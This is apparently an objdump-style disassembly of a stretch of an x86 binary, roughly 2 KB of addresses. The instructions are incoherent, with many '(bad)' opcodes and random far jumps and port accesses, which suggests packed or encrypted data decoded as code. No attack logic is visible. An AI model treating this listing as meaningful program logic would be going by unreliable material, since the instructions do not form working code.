  417858:	call   0x5668:0xd52b33ec
  41785f:	and    edx,ebx
  417861:	or     ah,BYTE PTR ds:0x772b7bb9
  417867:	add    BYTE PTR [edi],bh
  417869:	xor    dl,ah
  41786b:	and    al,0xa8
  41786d:	inc    ebp
  41786e:	pop    esp
  41786f:	mov    BYTE PTR [ecx-0x52d93e29],bl
  417875:	mov    bl,0xb2
  417877:	add    DWORD PTR [ebp-0x7e16d40c],esp
  41787d:	ret    0x92b5
  417880:	(bad)  
  417881:	add    ecx,DWORD PTR [esi+0x5d28f5fb]
  417887:	and    BYTE PTR [edi],0xc0
  41788a:	xor    al,0x96
  41788c:	sbb    BYTE PTR [ecx],ah
  41788e:	dec    ebx
  41788f:	das    
  417890:	aaa    
  417891:	jle    0x417893
  417893:	ret    0xbf61
  417896:	stos   BYTE PTR es:[edi],al
  417897:	xor    al,0x64
  417899:	imul   edi
  41789b:	mov    ds:0x785c61f9,al
  4178a0:	push   esp
  4178a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178a2:	pop    ecx
  4178a3:	stc    
  4178a4:	mov    cl,0x30
  4178a6:	arpl   WORD PTR [esi],si
  4178a8:	push   edi
  4178a9:	adc    esi,DWORD PTR ds:0xcaa2b335
  4178af:	js     0x417928
  4178b1:	aad    0x67
  4178b3:	cs jmp 0xf3e3:0x88f09939
  4178bb:	fld    QWORD PTR [edi+0x3acae1ba]
  4178c1:	push   ss
  4178c2:	aas    
  4178c3:	xchg   esp,eax
  4178c4:	pop    esi
  4178c5:	sahf   
  4178c6:	ret    
  4178c7:	mov    WORD PTR [eax],es
  4178c9:	stos   BYTE PTR es:[edi],al
  4178ca:	dec    edi
  4178cb:	mov    al,0x57
  4178cd:	ins    BYTE PTR es:[edi],dx
  4178ce:	lds    esi,FWORD PTR [esi-0x6603327b]
  4178d4:	push   ds
  4178d5:	daa    
  4178d6:	int3   
  4178d7:	jne    0x417926
  4178d9:	xchg   esi,eax
  4178da:	test   BYTE PTR [edi],dl
  4178dc:	stos   BYTE PTR es:[edi],al
  4178dd:	leave  
  4178de:	out    0x9a,eax
  4178e0:	imul   ebp
  4178e2:	pop    edx
  4178e3:	(bad)  
  4178e4:	stc    
  4178e5:	popf   
  4178e6:	push   0xe463135d
  4178eb:	xchg   edx,eax
  4178ec:	ja     0x4178a4
  4178ee:	inc    esi
  4178ef:	pop    edi
  4178f0:	in     eax,dx
  4178f1:	pusha  
  4178f2:	or     eax,0x764150b2
  4178f7:	inc    ebx
  4178f8:	jae    0x417968
  4178fa:	push   es
  4178fb:	mov    ds:0x85b3c35,eax
  417900:	enter  0x39d7,0x92
  417904:	sti    
  417905:	test   al,0xd2
  417907:	jo     0x41794a
  417909:	js     0x41791a
  41790b:	loope  0x417904
  41790d:	std    
  41790e:	add    DWORD PTR [edi-0x3d8db2c7],esi
  417914:	mov    fs,edx
  417916:	sbb    eax,DWORD PTR [edi]
  417918:	push   0x75
  41791a:	jbe    0x417941
  41791c:	out    0x97,al
  41791e:	sbb    ah,BYTE PTR [ebx-0x1e]
  417921:	mov    ds:0x5a9196c2,al
  417926:	aaa    
  417927:	fwait
  417928:	into   
  417929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41792a:	(bad)  
  41792b:	xchg   edi,eax
  41792c:	outs   dx,BYTE PTR ds:[esi]
  41792d:	(bad)  
  41792e:	adc    al,0x20
  417930:	das    
  417931:	dec    edx
  417932:	sub    ebp,0x8147c3ba
  417938:	dec    eax
  417939:	jle    0x417901
  41793b:	inc    ebx
  41793c:	cmp    al,0xcb
  41793e:	pusha  
  41793f:	xor    dl,BYTE PTR [edx]
  417941:	out    0x21,eax
  417943:	scas   al,BYTE PTR es:[edi]
  417944:	dec    eax
  417945:	pop    esp
  417946:	out    0x19,al
  417948:	cwde   
  417949:	pop    esi
  41794a:	fst    QWORD PTR [eax+0x60]
  41794d:	xchg   esi,eax
  41794e:	cld    
  41794f:	je     0x417980
  417951:	sub    ebp,DWORD PTR [edx]
  417953:	push   esi
  417954:	dec    edi
  417955:	stc    
  417956:	mov    WORD PTR [eax],cs
  417958:	sub    DWORD PTR fs:[edi+0x71],0x8269524
  417960:	or     al,0x7c
  417962:	mov    bl,0xfa
  417964:	enter  0xc5ff,0xfb
  417968:	setb   BYTE PTR [ebx-0x30]
  41796c:	call   0x4f0bc0b7
  417971:	adc    bl,BYTE PTR [esi]
  417973:	xlat   BYTE PTR ds:[ebx]
  417974:	mov    ebx,0x4c380835
  417979:	inc    eax
  41797a:	xchg   edx,eax
  41797b:	mov    ds:0x431d773d,eax
  417980:	arpl   WORD PTR [ecx+0x33],sp
  417983:	adc    bl,BYTE PTR [edi-0x4dcf28a4]
  417989:	cwde   
  41798a:	outs   dx,DWORD PTR ds:[esi]
  41798b:	cld    
  41798c:	ins    DWORD PTR es:[edi],dx
  41798d:	jmp    0x9cc4:0xd2c674a1
  417994:	repz inc ebp
  417996:	cmp    DWORD PTR [ebx+0x4b45b96f],esi
  41799c:	jg     0x4179c1
  41799e:	(bad)  
  41799f:	popa   
  4179a0:	mov    WORD PTR [edi-0x6e0f4662],es
  4179a6:	call   0x6a6243cf
  4179ab:	inc    edx
  4179ac:	sub    ch,BYTE PTR [esi-0x20641c6d]
  4179b2:	push   0x2f
  4179b4:	xchg   DWORD PTR [ebp-0x45c4cc68],ebx
  4179ba:	pop    ebp
  4179bb:	inc    esp
  4179bc:	daa    
  4179bd:	mov    dh,0x67
  4179bf:	retf   0x6474
  4179c2:	enter  0xf133,0xec
  4179c6:	cmp    bh,BYTE PTR [edx]
  4179c8:	(bad)  
  4179c9:	mov    ecx,0x84dc8a5a
  4179ce:	inc    ebx
  4179cf:	ja     0x4179b3
  4179d1:	mov    dl,0x90
  4179d3:	push   eax
  4179d4:	add    bh,0xc3
  4179d7:	push   es
  4179d8:	push   eax
  4179d9:	in     al,0x3a
  4179db:	test   eax,0x1f13e191
  4179e0:	test   DWORD PTR [ecx+0x4503ec23],ebx
  4179e6:	out    dx,al
  4179e7:	push   ecx
  4179e8:	stc    
  4179e9:	cmp    BYTE PTR [ebp+eax*1-0x6e5130ea],al
  4179f0:	arpl   WORD PTR [edi-0x1e],bx
  4179f3:	out    0xea,al
  4179f5:	jno    0x417a2d
  4179f7:	mov    ds:0xbb24cbf2,eax
  4179fc:	cmp    ebx,DWORD PTR [ecx+0x73]
  4179ff:	xchg   ecx,eax
  417a00:	fadd   QWORD PTR [eax+0x1edf6a73]
  417a06:	pop    esi
  417a07:	jl     0x417a86
  417a09:	hlt    
  417a0a:	scas   eax,DWORD PTR es:[edi]
  417a0b:	sbb    eax,DWORD PTR [edi+0xf]
  417a0e:	cwde   
  417a0f:	and    edi,DWORD PTR [ebx+0x59811832]
  417a15:	imul   edi,DWORD PTR [esi+0x23],0xffffffca
  417a19:	jne    0x417a2f
  417a1b:	inc    edi
  417a1c:	xor    ebx,DWORD PTR [ecx+eiz*2]
  417a1f:	scas   eax,DWORD PTR es:[edi]
  417a20:	popa   
  417a21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a22:	dec    edx
  417a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a24:	jo     0x4179bc
  417a26:	or     al,0x48
  417a28:	das    
  417a29:	jg     0x417a7d
  417a2b:	jae    0x417a42
  417a2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a2e:	add    BYTE PTR [eax-0x39b97def],cl
  417a34:	jecxz  0x417ab1
  417a36:	xor    al,0xc0
  417a38:	lods   al,BYTE PTR ds:[esi]
  417a39:	mov    al,ds:0x296a31c9
  417a3e:	dec    esp
  417a3f:	hlt    
  417a40:	scas   eax,DWORD PTR es:[edi]
  417a41:	(bad)  [ebx-0x70]
  417a44:	pop    ebp
  417a45:	in     eax,0x6
  417a47:	push   0xdc139379
  417a4c:	xor    BYTE PTR [edx-0x617ef901],al
  417a52:	cmp    ebp,ecx
  417a54:	mov    ecx,0xd2d42cc6
  417a59:	ja     0x417a50
  417a5b:	xor    BYTE PTR [edi],0xd4
  417a5e:	popa   
  417a5f:	mov    bl,0x2b
  417a61:	jnp    0x417a1b
  417a63:	in     al,0x39
  417a65:	inc    ebx
  417a66:	bound  edi,QWORD PTR [ecx+ebp*2+0x31]
  417a6a:	hlt    
  417a6b:	in     al,dx
  417a6c:	int    0x5a
  417a6e:	xchg   BYTE PTR [ecx-0xb70342a],dl
  417a74:	sub    eax,0xebf31844
  417a79:	ret    
  417a7a:	jmp    0x42da:0x5e8736f0
  417a81:	mov    bl,0x4f
  417a83:	fimul  WORD PTR [edx]
  417a85:	pop    es
  417a86:	popa   
  417a87:	retf   
  417a88:	mov    esp,0xad9f0e4b
  417a8d:	mov    bl,0x70
  417a8f:	mov    DWORD PTR [ecx+0x6f],esp
  417a92:	add    dl,BYTE PTR [edx]
  417a94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a95:	(bad)  
  417a96:	xchg   edx,eax
  417a97:	or     eax,0x2449166c
  417a9c:	sub    ah,dl
  417a9e:	push   edx
  417a9f:	ret    0x7aa4
  417aa2:	sub    edx,DWORD PTR [edx-0x7b7bf138]
  417aa8:	(bad)  
  417aa9:	sub    eax,edx
  417aab:	sti    
  417aac:	repz dec ecx
  417aae:	xchg   ecx,eax
  417aaf:	call   DWORD PTR [edx+edx*8-0x53ad2d3b]
  417ab6:	outs   dx,DWORD PTR ds:[esi]
  417ab7:	mov    WORD PTR [ecx+0x536b8eb],cs
  417abd:	aad    0x18
  417abf:	test   al,0x3f
  417ac1:	push   es
  417ac2:	jg     0x417ab2
  417ac4:	jle    0x417a5d
  417ac6:	inc    edx
  417ac7:	mov    bh,0x4f
  417ac9:	adc    BYTE PTR [edi-0x5],bh
  417acc:	jmp    0xfed3c654
  417ad1:	rcr    ecx,0x8b
  417ad4:	and    ecx,ebp
  417ad6:	jo     0x417a77
  417ad8:	fs mov ebp,0x1cefbbba
  417ade:	dec    ebp
  417adf:	jmp    0xc56f:0x80f6e09b
  417ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ae7:	sbb    esp,DWORD PTR [ebx]
  417ae9:	aas    
  417aea:	mov    dh,0x30
  417aec:	adc    DWORD PTR [ebx],ebp
  417aee:	scas   eax,DWORD PTR es:[edi]
  417aef:	mov    ecx,0x66729c95
  417af4:	bound  edi,QWORD PTR [edi]
  417af6:	pop    esi
  417af7:	and    esp,edx
  417af9:	sti    
  417afa:	js     0x417b1c
  417afc:	and    esi,edx
  417afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417aff:	fwait
  417b00:	retf   
  417b01:	pop    edx
  417b02:	jg     0x417b49
  417b04:	sub    ecx,DWORD PTR [ecx-0x40]
  417b07:	call   0x3c09:0x9518f7ed
  417b0e:	fnsave [edx-0x7]
  417b11:	sti    
  417b12:	lds    esp,FWORD PTR [edi+0x61866841]
  417b18:	shl    BYTE PTR [eax+0x24],1
  417b1b:	cmp    al,0x8d
  417b1d:	jne    0x417b58
  417b1f:	addr16 mov ch,0x26
  417b22:	and    eax,DWORD PTR [edx+ecx*8+0x18f053f9]
  417b29:	adc    al,0x31
  417b2b:	or     al,0x3c
  417b2d:	popa   
  417b2e:	mov    WORD PTR [ebp+0x6d],ss
  417b31:	mov    dh,0xe5
  417b33:	jne    0x417b73
  417b35:	shr    DWORD PTR [edx+0x22],0xc3
  417b39:	pusha  
  417b3a:	(bad)  
  417b3b:	imul   esi,DWORD PTR [edi],0x4d
  417b3e:	mov    ds:0xf0095c44,eax
  417b43:	adc    eax,0xb2c9a016
  417b48:	mov    esi,DWORD PTR [ebp-0x72]
  417b4b:	add    DWORD PTR [ebp+0x335102b8],ebx
  417b51:	mov    edx,0xc9a68987
  417b56:	dec    esp
  417b57:	mov    eax,0xe73985af
  417b5c:	ret    
  417b5d:	cwde   
  417b5e:	add    DWORD PTR cs:[eax],ebx
  417b61:	or     dh,bh
  417b63:	das    
  417b64:	adc    cl,dh
  417b66:	xor    DWORD PTR [ebx-0x5d],0xe0a9fc53
  417b6d:	sahf   
  417b6e:	jo     0x417b08
  417b70:	div    edx
  417b72:	mov    eax,0xa8d4edc2
  417b77:	leave  
  417b78:	in     eax,0x86
  417b7a:	and    BYTE PTR [ecx+0x69],0x58
  417b7e:	retf   0x52b0
  417b81:	jbe    0x417b51
  417b83:	xor    edx,DWORD PTR [bp+0x72]
  417b87:	jae    0x417b9d
  417b89:	cld    
  417b8a:	adc    BYTE PTR ds:[ecx],dl
  417b8d:	imul   esi,DWORD PTR [ebx-0x170f1559],0x51
  417b94:	jmp    0x417bc4
  417b96:	and    ecx,ebx
  417b98:	mov    ah,0xb9
  417b9a:	bsf    edi,DWORD PTR es:[edi-0x5f00abb4]
  417ba2:	das    
  417ba3:	cli    
  417ba4:	mov    WORD PTR [ecx-0x61],es
  417ba7:	mov    eax,0x91794859
  417bac:	jbe    0x417b67
  417bae:	xor    eax,0x1f0acd8c
  417bb3:	dec    edx
  417bb4:	inc    edx
  417bb5:	pop    ecx
  417bb6:	pop    DWORD PTR [edx+eiz*2]
  417bb9:	imul   ecx,ecx,0x6631b922
  417bbf:	loope  0x417c18
  417bc1:	jmp    0x417c3e
  417bc3:	popa   
  417bc4:	lds    ebx,FWORD PTR [esi-0x71457dd9]
  417bca:	gs out dx,eax
  417bcc:	arpl   WORD PTR ds:0x5bfce926,si
  417bd2:	mov    al,0x84
  417bd4:	leave  
  417bd5:	adc    dl,BYTE PTR [ecx+0x76251bc]
  417bdb:	lock mov BYTE PTR [esi+ebp*4+0x6d],dh
  417be0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417be1:	pop    esp
  417be2:	repnz mov WORD PTR [edi],ss
  417be5:	call   0xeeef75e3
  417bea:	xor    ecx,DWORD PTR [esi]
  417bec:	retf   0x774d
  417bef:	aaa    
  417bf0:	mov    ecx,eax
  417bf2:	addr16 pop ds
  417bf4:	jmp    esi
  417bf6:	push   esi
  417bf7:	fcomp  DWORD PTR [ebx]
  417bf9:	jae    0x417bed
  417bfb:	xor    eax,0xdce9c286
  417c00:	and    al,0xc5
  417c02:	pop    edx
  417c03:	(bad)  
  417c04:	bound  esi,QWORD PTR [ebp-0x744a467e]
  417c0a:	das    
  417c0b:	ins    DWORD PTR es:[edi],dx
  417c0c:	or     edi,edx
  417c0e:	aad    0x57
  417c10:	mov    al,ds:0x5e949504
  417c15:	fs test al,dl
  417c18:	pusha  
  417c19:	xor    DWORD PTR [edi+0x2bc54a8a],ecx
  417c1f:	add    BYTE PTR [ecx+0x11],0x39
  417c23:	dec    ecx
  417c24:	jno    0x417ca4
  417c26:	test   eax,0x18fb12b4
  417c2b:	mov    esi,0x3cf80f49
  417c30:	imul   edx,DWORD PTR ds:0xa92f82,0x180fcce3
  417c3a:	pop    edi
  417c3b:	adc    DWORD PTR [edx+0x74],edx
  417c3e:	fs adc eax,0x3ed450a4
  417c44:	mul    DWORD PTR [edx+0x4f]
  417c47:	cmp    eax,0x27dcd1f1
  417c4c:	push   edx
  417c4d:	out    0xe1,eax
  417c4f:	mov    ecx,0x3592aaa6
  417c54:	jg     0x417ca2
  417c56:	je     0x417c49
  417c58:	out    dx,al
  417c59:	fs dec eax
  417c5b:	mov    al,ds:0x80592c9a
  417c60:	(bad)  
  417c62:	ret    
  417c63:	(bad)  
  417c64:	xor    al,BYTE PTR [edi-0x2c125f11]
  417c6a:	inc    ecx
  417c6b:	sbb    eax,esp
  417c6d:	imul   edx,ebp,0xffffffc1
  417c70:	cwde   
  417c71:	mov    bh,0x71
  417c73:	or     edi,DWORD PTR [edx]
  417c75:	mov    ds:0xb16fe4cd,al
  417c7a:	in     eax,dx
  417c7b:	dec    esi
  417c7c:	inc    ecx
  417c7d:	xchg   ebp,eax
  417c7e:	adc    ch,BYTE PTR [eax+eax*1-0x307f1dff]
  417c85:	lds    ecx,FWORD PTR [ebx-0x513744ba]
  417c8b:	repnz mov edx,0xac1f8510
  417c91:	xchg   ebx,eax
  417c92:	loope  0x417c73
  417c94:	xchg   edi,eax
  417c95:	push   ebx
  417c96:	mov    DWORD PTR [edi],esi
  417c98:	(bad)  
  417c99:	fnsave [esi+eax*4]
  417c9c:	loopne 0x417c83
  417c9e:	rcl    DWORD PTR [edi],1
  417ca0:	sahf   
  417ca1:	sahf   
  417ca2:	push   0x40099608
  417ca7:	int    0x92
  417ca9:	call   0x5710:0x50f6d6cd
  417cb0:	inc    esi
  417cb1:	add    esi,DWORD PTR [ebx-0x4a]
  417cb4:	push   DWORD PTR [eax+0x7a]
  417cb7:	jecxz  0x417d1c
  417cb9:	scas   al,BYTE PTR es:[edi]
  417cba:	cli    
  417cbb:	jns    0x417c58
  417cbd:	imul   ebp,DWORD PTR [esi],0xff59e65a
  417cc3:	popa   
  417cc4:	add    BYTE PTR [ecx+0x6a],dh
  417cc7:	lds    edx,FWORD PTR [esi+eax*8-0x4f6b1818]
  417cce:	(bad)  
  417cd0:	bound  esp,QWORD PTR [edi-0xae29ca]
  417cd6:	in     ax,0x74
  417cd9:	jmp    0x80417b88
  417cde:	adc    eax,0x6f89f5bf
  417ce3:	pop    ds
  417ce4:	dec    edi
  417ce5:	push   esi
  417ce6:	stos   DWORD PTR es:[edi],eax
  417ce7:	fld    DWORD PTR [esi-0x4a]
  417cea:	jnp    0x417ccd
  417cec:	push   ecx
  417ced:	push   edx
  417cee:	ret    0x5715
  417cf1:	je     0x417d47
  417cf3:	inc    ecx
  417cf4:	or     DWORD PTR [ecx],ecx
  417cf6:	dec    ecx
  417cf7:	adc    edx,DWORD PTR [esi+ebx*1]
  417cfa:	sub    esi,DWORD PTR [ebp-0x3c]
  417cfd:	add    DWORD PTR [esi-0x28],esi
  417d00:	cld    
  417d01:	jg     0x417d44
  417d03:	and    bl,bh
  417d05:	aaa    
  417d06:	sub    BYTE PTR ds:0xd3f342cb,bh
  417d0c:	dec    ebx
  417d0d:	dec    edi
  417d0f:	push   ecx
  417d10:	mov    edx,0x2e4f9e9
  417d15:	mov    edi,DWORD PTR [edi]
  417d17:	daa    
  417d18:	retf   
  417d19:	test   al,0xfa
  417d1b:	imul   ecx,edx,0xffffffcb
  417d1e:	in     eax,0x22
  417d20:	outs   dx,BYTE PTR ds:[esi]
  417d21:	mov    eax,ds:0xdb1a10c
  417d26:	push   ds
  417d27:	ret    0xbe19
  417d2a:	xchg   ebp,eax
  417d2b:	ins    BYTE PTR es:[edi],dx
  417d2c:	div    BYTE PTR [ecx]
  417d2e:	iret   
  417d2f:	mov    WORD PTR [edi-0x5b3743dc],cs
  417d35:	scas   al,BYTE PTR es:[edi]
  417d36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d37:	push   es
  417d38:	neg    DWORD PTR [edi]
  417d3a:	sti    
  417d3b:	or     eax,0x6e5bb58b
  417d40:	pop    ds
  417d41:	int    0x1f
  417d43:	or     ah,BYTE PTR [ecx+0x53]
  417d46:	add    edi,DWORD PTR [eax+0x1e]
  417d49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d4a:	stos   DWORD PTR es:[edi],eax
  417d4b:	aaa    
  417d4c:	dec    edi
  417d4d:	imul   edx,DWORD PTR [ecx+edi*2-0x53],0xfffffff4
  417d52:	sahf   
  417d53:	dec    edi
  417d54:	scas   eax,DWORD PTR es:[edi]
  417d55:	add    al,0x84
  417d58:	sub    al,0x90
  417d5a:	push   ecx
  417d5b:	shl    DWORD PTR [eax-0x26e79226],1
  417d61:	cdq    
  417d62:	fisttp WORD PTR [ecx+0x60ecb48a]
  417d68:	cmp    cl,BYTE PTR [esi+0x2f]
  417d6b:	push   ebp
  417d6c:	cmc    
  417d6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d6e:	or     bh,al
  417d70:	(bad)  
  417d71:	pop    ebp
  417d72:	sbb    al,0x84
  417d74:	ficom  WORD PTR [ecx]
  417d76:	dec    edx
  417d77:	fstp   DWORD PTR [ebx+esi*1-0x74e24caf]
  417d7e:	add    al,0x98
  417d80:	ss jo  0x417d73
  417d83:	or     ch,BYTE PTR [ecx]
  417d85:	pop    es
  417d86:	xor    al,0x47
  417d88:	pop    esp
  417d89:	jmp    0xaef:0x5039251
  417d90:	jl     0x417d2e
  417d92:	mov    ch,0xac
  417d94:	loopne 0x417da3
  417d96:	mov    ebp,fs
  417d98:	mov    esi,0x41b64cb3
  417d9d:	push   edx
  417d9e:	fisttp DWORD PTR [edi+0x43]
  417da1:	pop    ebp
  417da2:	in     al,0xcb
  417da4:	xchg   ebp,eax
  417da5:	or     al,0xfc
  417da7:	test   eax,0x61eb503f
  417dac:	mov    ds:0x7b8d65c7,eax
  417db1:	mov    dl,0x1d
  417db3:	jge    0x417e0c
  417db5:	xor    esp,DWORD PTR [edx]
  417db7:	bts    DWORD PTR [esi-0x1e],eax
  417dbb:	dec    ecx
  417dbc:	pop    esp
  417dbd:	and    eax,0xcad218ad
  417dc2:	mov    edx,0xcd2ce47c
  417dc7:	add    bh,BYTE PTR [ecx]
  417dc9:	lods   al,BYTE PTR ds:[esi]
  417dca:	(bad)  
  417dcc:	xor    eax,0xdec4ae17
  417dd1:	int    0xb1
  417dd3:	out    0xf8,al
  417dd5:	ret    
  417dd6:	fidiv  DWORD PTR [ebp+0x59]
  417dd9:	dec    eax
  417dda:	shr    BYTE PTR [esi+ebx*2-0x56408a0e],0x95
  417de2:	shr    esp,1
  417de4:	push   ebx
  417de5:	jb     0x417d98
  417de7:	(bad)  
  417de8:	xlat   BYTE PTR ds:[ebx]
  417de9:	push   ebp
  417dea:	lds    edx,FWORD PTR [ecx+ecx*2-0x76c1d12e]
  417df1:	pop    ebp
  417df2:	jbe    0x417e17
  417df4:	sti    
  417df5:	jne    0x417d9f
  417df7:	pop    ds
  417df8:	loop   0x417e37
  417dfa:	arpl   WORD PTR [esi-0x15c654e0],si
  417e00:	std    
  417e01:	sahf   
  417e02:	mov    edi,0xe8c0e26b
  417e07:	pop    esi
  417e08:	shl    BYTE PTR [ebx],1
  417e0a:	repz mov dl,0x44
  417e0d:	imul   edi,DWORD PTR [ebp-0x24a34b87],0xc97a443
  417e17:	arpl   WORD PTR [edx],sp
  417e19:	pusha  
  417e1a:	sbb    bl,BYTE PTR [ecx+edi*8+0x22dbe051]
  417e21:	leave  
  417e22:	into   
  417e23:	jmp    0x9aac:0x99143f85
  417e2a:	dec    esi
  417e2b:	mov    esi,0xe15bb8b3
  417e30:	stc    
  417e31:	jmp    0x8bb1:0xa5d1ebf0
  417e38:	loopne 0x417e4c
  417e3a:	mov    edx,0x68e58512
  417e3f:	jge    0x417e20
  417e41:	mov    ds:0xcb0b1307,eax
  417e46:	dec    ebx
  417e47:	into   
  417e48:	dec    ecx
  417e49:	retf   
  417e4a:	or     ecx,eax
  417e4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e4d:	cwde   
  417e4e:	sub    esp,0x2f229f98
  417e54:	dec    DWORD PTR [eax+0x63]
  417e57:	pop    ecx
  417e58:	pushf  
  417e59:	pop    edi
  417e5a:	(bad)  
  417e5b:	or     ecx,DWORD PTR [eax+0x657f6d20]
  417e61:	push   edi
  417e62:	cmp    al,cl
  417e64:	jb     0x417ec5
  417e66:	adc    BYTE PTR [eax],dh
  417e68:	push   esi
  417e69:	mov    bh,0xff
  417e6b:	inc    ecx
  417e6c:	dec    edx
  417e6d:	out    dx,al
  417e6e:	mov    ch,0x2d
  417e70:	hlt    
  417e71:	adc    DWORD PTR [ebp+0x7d],esp
  417e74:	gs repz jge 0x417eab
  417e78:	ds (bad) 
  417e7a:	push   ebx
  417e7b:	test   al,0x28
  417e7d:	fcmovnu st,st(3)
  417e7f:	gs (bad) 
  417e82:	stos   BYTE PTR es:[edi],al
  417e83:	(bad)  
  417e85:	cmp    eax,0xb8bccca9
  417e8a:	mov    ebx,0x35dbd273
  417e8f:	scas   al,BYTE PTR es:[edi]
  417e90:	or     al,0x17
  417e92:	adc    BYTE PTR [edi],dh
  417e94:	out    0x64,al
  417e96:	test   DWORD PTR [ebp+0x4e],esp
  417e99:	retf   
  417e9a:	or     eax,0xaec5f3a9
  417e9f:	je     0x417e5e
  417ea1:	ret    0x97a5
  417ea4:	sbb    BYTE PTR [ebp+0x13],cl
  417ea7:	repz rcl DWORD PTR [ecx+0x4180dee4],cl
  417eae:	dec    esp
  417eaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417eb0:	test   BYTE PTR [eax-0x2c],dl
  417eb3:	pusha  
  417eb4:	dec    esi
  417eb5:	iret   
  417eb6:	push   cs
  417eb7:	int    0x39
  417eb9:	mov    BYTE PTR [ebp-0x7ee5b98d],ah
  417ebf:	or     DWORD PTR [edx],esp
  417ec1:	fiadd  WORD PTR [ebp+0x60]
  417ec4:	push   ss
  417ec5:	xchg   bl,bl
  417ec7:	nop
  417ec8:	mov    ecx,0x29400f1b
  417ecd:	jb     0x417f39
  417ecf:	loopne 0x417e72
  417ed1:	stos   BYTE PTR es:[edi],al
  417ed2:	cmp    al,0x4a
  417ed4:	pop    edx
  417ed5:	pop    esi
  417ed6:	ret    
  417ed7:	ins    DWORD PTR es:[edi],dx
  417ed8:	ret    0x9cba
  417edb:	hlt    
  417edc:	mov    ebx,0xef9c3962
  417ee1:	std    
  417ee2:	enter  0x8707,0xed
  417ee6:	jb     0x417eb6
  417ee8:	jmp    0x417f51
  417eea:	mov    eax,ds:0x4720ffa0
  417eef:	xchg   esp,eax
  417ef0:	(bad)  
  417ef1:	or     al,0xd4
  417ef3:	sbb    edx,DWORD PTR [eax+ecx*4+0x2967962e]
  417efa:	in     eax,0x32
  417efc:	mov    esp,0xe9e46a00
  417f01:	mov    ecx,0xdefd75de
  417f06:	sbb    BYTE PTR [esi],al
  417f08:	push   ss
  417f09:	sar    BYTE PTR ds:0x36b9120b,1
  417f0f:	jge    0x417eb2
  417f11:	adc    bh,bh
  417f13:	aaa    
  417f14:	pop    edi
  417f15:	sti    
  417f16:	nop
  417f17:	shr    BYTE PTR [ebx],cl
  417f19:	js     0x417ed0
  417f1b:	outs   dx,BYTE PTR ds:[esi]
  417f1c:	out    dx,al
  417f1d:	jge    0x417f8c
  417f1f:	jmp    0x68fd:0x61e43872
  417f26:	gs (bad) 
  417f28:	stos   BYTE PTR es:[edi],al
  417f29:	sbb    DWORD PTR [edi+ebx*2-0x21],ebp
  417f2d:	jne    0x417f57
  417f2f:	push   0xfffffffd
  417f31:	xor    dh,0xc5
  417f34:	inc    ecx
  417f35:	aas    
  417f36:	xor    ch,BYTE PTR ds:0x1ee058a6
  417f3c:	in     eax,dx
  417f3d:	sbb    dl,al
  417f3f:	mov    WORD PTR [edi+0x4f],cs
  417f42:	enter  0xc59b,0x51
  417f46:	jbe    0x417f90
  417f48:	pop    ss
  417f49:	push   0x4a2a0755
  417f4e:	out    dx,eax
  417f4f:	imul   BYTE PTR es:[ecx-0x2e]
  417f53:	aad    0xea
  417f55:	dec    ebx
  417f56:	jl     0x417fa5
  417f58:	cmp    esp,ebx
  417f5a:	sbb    DWORD PTR [eax+edi*2-0x7fa19821],ebx
  417f61:	daa    
  417f62:	lahf   
  417f63:	xchg   edx,eax
  417f64:	addr16 push 0x7ae74268
  417f6a:	dec    ebx
  417f6b:	xor    dh,bh
  417f6d:	ins    BYTE PTR es:[edi],dx
  417f6e:	sbb    BYTE PTR [edi-0x23],bh
  417f71:	sti    
  417f72:	xor    BYTE PTR [edx+0x4f],0x2b
  417f76:	popa   
  417f77:	xchg   ebx,eax
  417f78:	test   DWORD PTR ds:0x6f4c8a47,0xe6240b54
  417f82:	in     al,0x27
  417f84:	int    0x9c
  417f86:	clc    
  417f87:	push   es
  417f88:	std    
  417f89:	push   esp
  417f8a:	jmp    0x7d35:0x573bbb6f
  417f91:	lock sbb esi,ebp
  417f94:	scas   al,BYTE PTR es:[edi]
  417f95:	pop    eax
  417f96:	je     0x417f95
  417f98:	pop    edx
  417f99:	(bad)  
  417f9a:	mov    esi,0xe3bbe887
  417f9f:	mov    esi,0x99a660a1
  417fa4:	inc    ebx
  417fa5:	dec    ebx
  417fa6:	mov    eax,0x652136cb
  417fab:	push   es
  417fac:	mov    al,ds:0x69dbf942
  417fb1:	jecxz  0x417f36
  417fb3:	jecxz  0x417ff8
  417fb5:	jo     0x417fb6
  417fb7:	jb     0x418029
  417fb9:	fdiv   QWORD PTR [ecx-0x9]
  417fbc:	pop    esp
  417fbd:	inc    eax
  417fbe:	lods   al,BYTE PTR ds:[esi]
  417fbf:	xor    al,0xe0
  417fc1:	retf   
  417fc2:	sub    al,0x8b
  417fc4:	mov    cl,0x12
  417fc6:	push   ebx
  417fc7:	imul   esi,DWORD PTR [ebx-0x4cc68e81],0xabf2313a
  417fd1:	or     al,0x70
  417fd3:	xor    BYTE PTR [ebx],cl
  417fd5:	fisub  WORD PTR [ebx]
  417fd7:	sub    al,0x12
  417fd9:	dec    edx
  417fda:	(bad)  
  417fdb:	stc    
  417fdc:	test   DWORD PTR [edi],0xa8d6c97
  417fe2:	jecxz  0x417f8c
  417fe4:	xchg   edx,eax
  417fe5:	xchg   dh,bh
  417fe7:	pop    edx
  417fe8:	dec    esp
  417fe9:	rcl    BYTE PTR [eax],cl
  417feb:	call   0x3bdc:0x7ab810bd
  417ff2:	sbb    ch,BYTE PTR [esi-0x4858ad44]
  417ff8:	icebp  
  417ff9:	mov    dl,0xef
  417ffb:	mov    dh,0xcb
  417ffd:	dec    ebp
  417ffe:	jne    0x418047
  418000:	pop    esp
  418001:	out    dx,eax
  418002:	fld    QWORD PTR [eax]
  418004:	mov    ah,0x2c
  418006:	pop    esp
  418007:	call   0x179d:0xda72e056
